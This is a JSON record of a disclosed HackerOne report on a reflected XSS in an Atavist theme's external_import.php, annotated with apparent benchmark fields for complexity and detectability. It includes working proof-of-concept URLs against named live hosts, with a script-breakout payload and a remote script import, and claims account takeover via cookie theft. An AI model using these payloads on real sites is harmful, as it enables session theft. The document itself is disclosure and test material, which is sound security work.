{
  "reported_to": "Automattic",
  "reported_by": "bugra ",
  "title": "Reflected XSS on a Atavist theme at external_import.php",
  "content": "\nSummary:\nHi team,\nI found this php file https://magazine.atavist.com/static/external_import.php , and there is a parameter called scripts on this php file.\nBasically, the endpoint prints value of scripts parameter to <script src='$Value'>.\nSo we can import any script file like that : https://magazine.atavist.com/static/external_import.php?scripts=//15.rs\nOr we can write HTML tags too, there is no encoding : https://magazine.atavist.com/static/external_import.php?scripts=%27%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E\nThis endpoint is also available on other websites. Like :\nhttps://docs.atavist.com/static/external_import.php?scripts=%27%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E\nhttp://www.377union.com/static/external_import.php?scripts=%27%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E\nAlso there is no secure flag on the session cookie (periodicSessionatavist). So this XSS leads to account takeover.\nImpact\nReflected XSS - account takeover via cookie stealing\nThanks,\nBugra\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "Cross-site Scripting (XSS) - Reflected"
  ],
  "screenshots": {},
  "disclosed_date": 1605727260,
  "report_url": "https://hackerone.com/reports/976657",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Identify the vulnerable endpoint: https://magazine.atavist.com/static/external_import.php"
    ],
    [
      2,
      "Inject malicious script via the 'scripts' parameter: https://magazine.atavist.com/static/external_import.php?scripts=%27%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E"
    ]
  ],
  "vuln_description": "Reflected XSS vulnerability in the 'scripts' parameter of external_import.php file, which allows arbitrary JavaScript execution due to lack of output encoding. The vulnerability can lead to account takeover via cookie stealing since the session cookie lacks secure flag.",
  "reason": "The vulnerability is straightforward to discover as it involves a simple parameter manipulation with no complex interactions or state manipulations required. The attack vector is a common XSS pattern with no novel logic.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "reasoning": "The vulnerability involves a reflected XSS where the 'scripts' parameter value is directly injected into a <script> tag without sanitization. The payload used ('></script><script>alert(1)</script>) is a basic XSS vector that does not require filter bypasses or complex encoding. The methodology's 'simple payload' list would include such context-breaking payloads, and the injection would be detectable in the HTTP response itself (same channel). Since no advanced techniques or multi-role navigation are required, it aligns with the methodology.",
    "is_simple_injection": true
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves a reflected XSS where the 'scripts' parameter is directly injected into the HTML without proper encoding. The methodology described focuses on authentication and authorization issues (AuthN/AuthZ) and IDOR vulnerabilities by testing different user sessions and resource IDs within the same application. Since XSS is a client-side vulnerability that does not directly involve AuthN/AuthZ or IDOR, it would not be detected by the described methodology.",
    "is_detectable": false
  }
}